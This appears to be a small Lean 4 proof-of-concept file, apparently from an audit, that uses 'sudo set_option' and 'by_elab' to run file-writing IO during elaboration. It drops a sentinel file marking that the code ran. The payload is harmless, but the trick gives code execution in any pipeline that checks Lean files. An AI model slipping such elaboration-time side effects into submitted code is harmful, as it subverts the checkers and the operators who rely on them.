module
import Mathlib.Tactic.SudoSetOption
import Batteries.Lean.LawfulMonad
public section
def pwn : Nat :=
  sudo set_option compiler.checkMeta false in
  by_elab do
    IO.FS.writeFile "/Volumes/AgentStorage/fm/tmp/2312-d-review/sentinel_sudo_by_elab_pwned.txt" "SUDO_BY_ELAB_EXECUTED_IN_AUDIT"
    return Lean.mkNatLit 42
